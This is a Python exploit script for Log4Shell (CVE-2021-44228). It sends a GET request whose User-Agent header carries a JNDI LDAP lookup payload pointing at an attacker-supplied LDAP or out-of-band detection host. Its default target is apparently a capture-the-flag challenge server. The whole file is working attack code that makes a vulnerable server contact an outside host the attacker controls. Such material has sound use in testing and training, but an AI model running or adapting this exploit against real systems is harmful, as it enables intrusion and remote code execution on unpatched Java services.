#!/usr/bin/env python3

# CVE-2021-44228
# Sends GET request to target and tries to exploit Log4Shell
# by including LDAP lookup in User-Agent header
# Uses 'http://rsxc.no:20024' as vulnerable target by default,
# although this can be changed

# Requires a LDAP server or an OOB detection tool to verify
# that the exploit is working

# Usage: Run './log4shell.py --help' for help

import requests
import argparse

parser = argparse.ArgumentParser()

parser.add_argument('ldap_url', type=str, help="malicious ldap url (e.g. c8gctdu9lj4l2vnsu9ogceoc7qeyyyyyn.oast.online:389/dc=example)")
parser.add_argument('--target', nargs='?', default="http://rsxc.no:20024", type=str, help="custom target url (e.g. http://example.com:8080)")

args = parser.parse_args()

# Using ${lower} to prevent false positives
# (e.g. by DNS lookups not caused by Log4Shell)
# 'xaaax' is just an arbitrary pattern you can look for
# to verify that Log4Shell is exploited
user_agent = "${jndi:ldap://x${lower:AAAA}x.%s}" % args.ldap_url 

headers = {
    "Connection": "close",
    "User-Agent": user_agent
}

print(f"User-Agent set to: {user_agent}")
print(f"Sending request to {args.target}")

response = requests.get(args.target, headers = headers)
print("---")
print("Response:")
print("")
print(response.content)
